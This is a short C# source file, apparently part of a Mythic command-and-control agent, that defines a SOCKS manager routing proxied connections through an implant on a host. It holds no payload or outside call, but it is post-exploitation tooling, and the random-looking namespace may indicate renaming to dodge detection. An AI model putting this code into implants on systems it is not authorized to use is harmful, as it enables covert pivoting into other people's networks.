using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using AI = YXBqSVSFInterop;
using YXBqSVSFInterop.Interfaces;
using YXBqSVSFInterop.Structs.MythicStructs;
using System.Collections.Concurrent;
using YXBqSVSFInterop.Classes;
using System.Net.Sockets;
using YXBqSVSFInterop.Structs.YXBqSVSFStructs;
using YXBqSVSFInterop.Enums.YXBqSVSFEnums;
using static YXBqSVSFInterop.Structs.MythicStructs.MessageResponse;
using System.Net;

namespace YXBqSVSF.Management.Socks
{
    public class SocksManager : AI.Classes.SocksManager
    {
        private ConcurrentDictionary<int, SocksClient> _connections = new ConcurrentDictionary<int, SocksClient>();
        
        public SocksManager(IAgent agent) : base(agent)
        {

        }

        public override bool Route(SocksDatagram dg)
        {
            if (!_connections.ContainsKey(dg.ServerID))
            {
                if (!dg.Exit)
                {
                    SocksClient c = new SocksClient(_agent, dg.ServerID);
                    _connections.AddOrUpdate(c.ID, c, (int i, SocksClient d) => { return d; });
                } else { return dg.Exit; }
            }
            if (dg.Exit)
            {
                _connections[dg.ServerID].Exit();
                return dg.Exit;
            }
            return _connections[dg.ServerID].HandleDatagram(dg);
        }

        public override bool Remove(int id)
        {
            _connections[id].Exit();
            return _connections.TryRemove(id, out SocksClient _);
        }
    }
}
